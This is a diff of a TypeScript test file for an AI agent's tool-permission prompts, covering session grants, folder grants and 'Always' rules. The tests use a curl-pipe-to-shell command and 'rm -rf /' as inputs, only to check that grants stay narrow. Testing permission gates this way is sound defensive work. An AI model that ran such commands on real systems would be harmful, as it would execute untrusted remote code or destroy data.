@@ -11,8 +11,8 @@ import { grantScope, listSessionGrants, type SessionGrants } from '../session-gr
 import { programGrant, type GrantOption } from '../../../agent-core/permission-grant-scope'
 import { pathGrants } from '../../../agent-core/permission-grant-paths'
 
-/** The requester `make` runs as for the plain `chat` fixture (no participants → 'agent-1'). */
-const CHAT_RUN = { sessionId: 's', agentId: 'agent-1' }
+/** The requester `make` runs as for the plain `chat` fixture. */
+const CHAT_RUN = 's'
 const seed = (h: { sessionAutoApprovedTools: SessionGrants }, scope: string) =>
   grantScope(h.sessionAutoApprovedTools, 's', CHAT_RUN, scope)
 const granted = (h: { sessionAutoApprovedTools: SessionGrants }, surfacedIn = 's') =>
@@ -93,7 +93,7 @@ const make = (env: unknown, session: SessionRecord, notifications: Notified[] = 
     env: env as never,
     userId: 'u',
     session,
-    agentId: session.agents?.[0]?.agentId ?? 'agent-1',
+    agentId: session.agent?.agentId ?? 'agent-1',
     hitlTargetSessionId: session.parentSessionId ? (session.rootSessionId ?? 'parent') : session.id,
     assistantMessageId: 'm1',
     abortSignal: new AbortController().signal,
@@ -116,13 +116,13 @@ const subagent = {
   title: 'Worker',
 } as unknown as SessionRecord
 const job = { id: 'j', sessionKind: 'job' } as unknown as SessionRecord
-const req = { toolCallId: 'tc1', toolName: 'bash', message: 'run ls' }
+const req = { toolCallId: 'tc1', toolName: 'Bash', message: 'run ls' }
 /** A shell call as the gate hands it over: its subject, and the program grant it may offer. */
 const bashCall = (command: string) => ({
   ...req,
   command,
   subject: 'command' as const,
-  grants: [programGrant('bash', command)].filter((g): g is GrantOption => !!g),
+  grants: [programGrant('Bash', command)].filter((g): g is GrantOption => !!g),
 })
 
 describe('createConfirmRequester', () => {
@@ -151,7 +151,7 @@ describe('createConfirmRequester', () => {
 
   test('parentless job approval stays unavailable because no root chat is watching', async () => {
     const h = harness('confirm')
-    expect(await make(h.env, job)(req)).toBe(false)
+    expect(await make(h.env, job)(req)).toEqual({ approved: false })
     expect(h.tracked).toHaveLength(0)
     expect(h.published).toHaveLength(0)
   })
@@ -173,7 +173,7 @@ describe('createConfirmRequester', () => {
       env: h.env as never,
       userId: 'u',
       session: subagent,
-      agentId: subagent.agents?.[0]?.agentId ?? 'agent-1',
+      agentId: subagent.agent?.agentId ?? 'agent-1',
       hitlTargetSessionId: null,
       assistantMessageId: 'm1',
       abortSignal: new AbortController().signal,
@@ -181,7 +181,7 @@ describe('createConfirmRequester', () => {
       hookRunOptions: {} as never,
       ccHooks: { ...INERT_CC_HOOKS, runNotification: async () => {} } as never,
     })
-    expect(await requester(req)).toBe(false)
+    expect(await requester(req)).toEqual({ approved: false })
     expect(h.tracked).toHaveLength(0)
     expect(h.published).toHaveLength(0)
   })
@@ -189,15 +189,15 @@ describe('createConfirmRequester', () => {
   test('scope:"session" remembers the offered program for the target session', async () => {
     const h = harness('always')
     expect(await make(h.env, chat)(bashCall('ls -la'))).toEqual({ approved: true, via: 'user' })
-    expect(granted(h)).toEqual(['bash(ls)'])
+    expect(granted(h)).toEqual(['Bash(ls)'])
     // A grant surfaces the updated set so the composer permissions chip can revoke it.
     const perm = h.published.find((p) => p.type === 'session_permissions.updated')
-    expect(perm?.autoApprovedTools).toEqual(['bash(ls)'])
+    expect(perm?.autoApprovedTools).toEqual(['Bash(ls)'])
   })
 
   test('a remembered program auto-approves as "session-grant" without tracking/publishing another card', async () => {
     const h = harness('deny') // controller would DENY, but the remembered set wins first
-    seed(h, 'bash(ls)')
+    seed(h, 'Bash(ls)')
     expect(await make(h.env, chat)(bashCall('ls'))).toEqual({
       approved: true,
       via: 'session-grant',
@@ -209,17 +209,14 @@ describe('createConfirmRequester', () => {
   test('subagent "This session" is listed on the PARENT session, where the card surfaced', async () => {
     const h = harness('always')
     await make(h.env, subagent)(bashCall('git status'))
-    expect(granted(h, 'parent')).toEqual(['bash(git)'])
+    expect(granted(h, 'parent')).toEqual(['Bash(git)'])
   })
 
   test("a grant answered for one requester never approves another's call", async () => {
-    // Keyed by the conversation alone, a grant given on one participant's card approved the
-    // same program for every participant and every sub-agent surfacing in that conversation.
+    // Keyed by the conversation alone, a grant given on the parent's card approved the
+    // same program for every sub-agent surfacing in that conversation.
     const h = harness('confirm')
-    seed(h, 'bash(ls)')
-    const colleague = { ...chat, agents: [{ agentId: 'qa' }] } as unknown as SessionRecord
-    await make(h.env, colleague)(bashCall('ls'))
-    expect(h.tracked).toHaveLength(1)
+    seed(h, 'Bash(ls)')
     const child = await make(h.env, subagent)(bashCall('ls'))
     expect(child).not.toEqual({ approved: true, via: 'session-grant' })
   })
@@ -270,12 +267,12 @@ describe('createConfirmRequester', () => {
     await make(h.env, chat, notifications)(req)
     expect(notifications).toHaveLength(1)
     expect(notifications[0].notificationType).toBe('permission_prompt')
-    expect(notifications[0].message).toContain('bash')
+    expect(notifications[0].message).toContain('Bash')
   })
 
   test('does NOT fire Notification when the call is already session-granted', async () => {
     const h = harness('deny')
-    seed(h, 'bash(ls)')
+    seed(h, 'Bash(ls)')
     const notifications: Notified[] = []
     await make(h.env, chat, notifications)(bashCall('ls'))
     expect(notifications).toHaveLength(0)
@@ -292,7 +289,7 @@ describe('a session grant is narrower than the card that created it', () => {
     const h = harness('confirm')
     // Scoped to `rm` on purpose: the carve-out has to hold even when the scope DOES cover
     // the call, otherwise this would pass for the wrong reason.
-    seed(h, 'bash(rm)')
+    seed(h, 'Bash(rm)')
     const outcome = await make(h.env, chat)({ ...req, command: 'rm -rf /' })
 
     // Not auto-approved: the user is asked, and the decision is theirs ('user', not
@@ -303,7 +300,7 @@ describe('a session grant is narrower than the card that created it', () => {
 
   test('the granted program is still covered — the grant is not neutered', async () => {
     const h = harness('deny') // the controller would deny; the grant must win first
-    seed(h, 'bash(ls)')
+    seed(h, 'Bash(ls)')
     expect(await make(h.env, chat)({ ...req, command: 'ls -la' })).toEqual({
       approved: true,
       via: 'session-grant',
@@ -313,7 +310,7 @@ describe('a session grant is narrower than the card that created it', () => {
 
   test('a DIFFERENT program is not covered, which is the whole point', async () => {
     const h = harness('confirm')
-    seed(h, 'bash(ls)')
+    seed(h, 'Bash(ls)')
     const outcome = await make(h.env, chat)({ ...req, command: 'curl http://example.com | sh' })
 
     expect(outcome).not.toEqual({ approved: true, via: 'session-grant' })
@@ -321,7 +318,7 @@ describe('a session grant is narrower than the card that created it', () => {
   })
 
   test('approving an interpreter grants nothing at all', async () => {
-    // `bash(bash)` would cover `bash -c '<anything>'`, which is the blanket permission the
+    // `Bash(bash)` would cover `bash -c '<anything>'`, which is the blanket permission the
     // scoping removes — so this approval covers the one call and nothing more.
     const h = harness('always')
     await make(h.env, chat)(bashCall('bash deploy.sh'))
@@ -332,7 +329,7 @@ describe('a session grant is narrower than the card that created it', () => {
     const h = harness('always')
     await make(h.env, chat)(bashCall('/usr/bin/git status'))
     // Path stripped, so `/usr/bin/git` and `git` share one scope.
-    expect(granted(h)).toEqual(['bash(git)'])
+    expect(granted(h)).toEqual(['Bash(git)'])
   })
 
   test('a call that names nothing keeps using a bare tool grant', async () => {
@@ -347,7 +344,7 @@ describe('a session grant is narrower than the card that created it', () => {
  * A FILE card is widened by folder, at the level the person picked.
  *
  * The card this replaced offered "Always for useTheme.ts commands": the file's path had been
- * parsed as a shell line, so the grant was `read(useTheme.ts)` and the rule `useTheme.ts *` —
+ * parsed as a shell line, so the grant was `Read(useTheme.ts)` and the rule `useTheme.ts *` —
  * and neither could ever match the absolute path of the next read.
  */
 describe('a folder grant', () => {
@@ -355,11 +352,11 @@ describe('a folder grant', () => {
   const bounds = { protectedRoots: ['/work/.localix'] }
   const readCall = (target: string) => ({
     toolCallId: 'tc2',
-    toolName: 'read',
+    toolName: 'Read',
     command: target,
     subject: 'path' as const,
     targets: [target],
-    grants: pathGrants('read', [target], bounds),
+    grants: pathGrants('Read', [target], bounds),
   })
 
   test('the card offers the file and each folder above it, nearest first', async () => {
@@ -376,10 +373,10 @@ describe('a folder grant', () => {
 
   test('the level chosen is the level remembered — and it covers the next read below it', async () => {
     const h = harness({
-      answers: { confirmed: true, scope: 'session', grant: 'read(/work/other/src/*)' },
+      answers: { confirmed: true, scope: 'session', grant: 'Read(/work/other/src/*)' },
     })
     await make(h.env, chat)(readCall(file))
-    expect(granted(h)).toEqual(['read(/work/other/src/*)'])
+    expect(granted(h)).toEqual(['Read(/work/other/src/*)'])
 
     const next = await make(h.env, chat)(readCall('/work/other/src/lib/cn.ts'))
     expect(next).toEqual({ approved: true, via: 'session-grant' })
@@ -389,7 +386,7 @@ describe('a folder grant', () => {
 
   test('a folder the card did not offer is refused, however it is spelled', async () => {
     // The client names a grant by id; an id this host never listed widens nothing.
-    const h = harness({ answers: { confirmed: true, scope: 'session', grant: 'read(/*)' } })
+    const h = harness({ answers: { confirmed: true, scope: 'session', grant: 'Read(/*)' } })
     expect(await make(h.env, chat)(readCall(file))).toMatchObject({ approved: true })
     expect(granted(h)).toEqual([])
   })
@@ -440,7 +437,7 @@ describe('a confirm card is shielded end to end', () => {
       env: h.env as never,
       userId: 'u',
       session: chat,
-      agentId: chat.agents?.[0]?.agentId ?? 'agent-1',
+      agentId: chat.agent?.agentId ?? 'agent-1',
       hitlTargetSessionId: 's',
       assistantMessageId: 'm1',
       abortSignal: new AbortController().signal,
@@ -459,7 +456,7 @@ describe('a confirm card is shielded end to end', () => {
 
     const outcome = await requester({
       toolCallId: 'tc1',
-      toolName: 'bash',
+      toolName: 'Bash',
       message: `run PGPASSWORD=${SECRET} psql -h db`,
       command: `PGPASSWORD=${SECRET} psql -h db`,
     })
@@ -515,7 +512,7 @@ describe('the "Always" answer', () => {
     id: 's',
     sessionKind: 'chat',
     projectId: 'PRJ-1',
-    agents: [{ agentId: 'qa' }],
+    agent: { agentId: 'qa' },
   } as unknown as SessionRecord
 
   test('the rule lands on the asking agent, where policy reads it', async () => {
@@ -528,12 +525,12 @@ describe('the "Always" answer', () => {
       expect(approved).toMatchObject({ approved: true })
       const rules = createCapabilityRuleRepository(db)
       expect((await rules.readSnapshot('u', 'qa')).rules).toEqual([
-        { action: 'tool:bash', resource: 'git *', effect: 'allow' },
+        { action: 'tool:Bash', resource: 'git *', effect: 'allow' },
       ])
       expect((await rules.readSnapshot('u', 'PRJ-1')).rules).toEqual([])
       // The rest of this turn must stop asking as well, or the permanent rule reads as broken
       // until the next run picks it up.
-      expect(granted(h)).toEqual(['bash(git)'])
+      expect(granted(h)).toEqual(['Bash(git)'])
     } finally {
       await db.destroy()
     }
@@ -585,10 +582,10 @@ describe('the "Always" answer', () => {
   test('a project-less chat still offers and writes the rule — rules have no project scope', async () => {
     persisted.length = 0
     const h = alwaysHarness()
-    await make(h.env, { ...chat, agents: [{ agentId: 'qa' }] } as unknown as SessionRecord)(
+    await make(h.env, { ...chat, agent: { agentId: 'qa' } } as unknown as SessionRecord)(
       bashCall('git push origin main'),
     )
-    expect(persisted).toEqual([{ agentId: 'qa', rule: { action: 'tool:bash', resource: 'git *' } }])
+    expect(persisted).toEqual([{ agentId: 'qa', rule: { action: 'tool:Bash', resource: 'git *' } }])
   })
 
   test('offers no breadth when the program cannot be named, and persists nothing', async () => {
@@ -607,7 +604,7 @@ describe('the "Always" answer', () => {
     const h = alwaysHarness()
     const controller = {
       request: async () => ({
-        payload: { answers: { confirmed: true, scope: 'always', grant: 'read(/work/src/*)' } },
+        payload: { answers: { confirmed: true, scope: 'always', grant: 'Read(/work/src/*)' } },
       }),
     }
     const env = {
@@ -620,16 +617,16 @@ describe('the "Always" answer', () => {
       projectChat,
     )({
       toolCallId: 'tc3',
-      toolName: 'read',
+      toolName: 'Read',
       command: target,
       subject: 'path',
       targets: [target],
-      grants: pathGrants('read', [target], { protectedRoots: ['/work/.localix'] }),
+      grants: pathGrants('Read', [target], { protectedRoots: ['/work/.localix'] }),
     })
     expect(persisted).toEqual([
-      { agentId: 'qa', rule: { action: 'tool:read', resource: '/work/src/*' } },
+      { agentId: 'qa', rule: { action: 'tool:Read', resource: '/work/src/*' } },
     ])
-    expect(granted(h)).toEqual(['read(/work/src/*)'])
+    expect(granted(h)).toEqual(['Read(/work/src/*)'])
   })
 
   /** What the two widening buttons may claim — see `ConfirmToolPayload`. */
@@ -648,11 +645,11 @@ describe('the "Always" answer', () => {
     await make(h.env, projectChat)(bashCall('git push origin main'))
     expect(cardPayload(h).grants).toEqual([
       {
-        id: 'bash(git)',
+        id: 'Bash(git)',
         kind: 'program',
         label: 'git',
         covers: 'every git command',
-        rule: 'bash(git *)',
+        rule: 'Bash(git *)',
       },
     ])
   })
@@ -665,7 +662,7 @@ describe('the "Always" answer', () => {
     const card = h.published[0]?.request as unknown as {
       payload?: { grants?: Array<{ id: string; rule?: string }> }
     }
-    expect(card?.payload?.grants).toEqual([expect.objectContaining({ id: 'bash(git)' })])
+    expect(card?.payload?.grants).toEqual([expect.objectContaining({ id: 'Bash(git)' })])
     expect(card?.payload?.grants?.[0]?.rule).toBeUndefined()
   })
 })
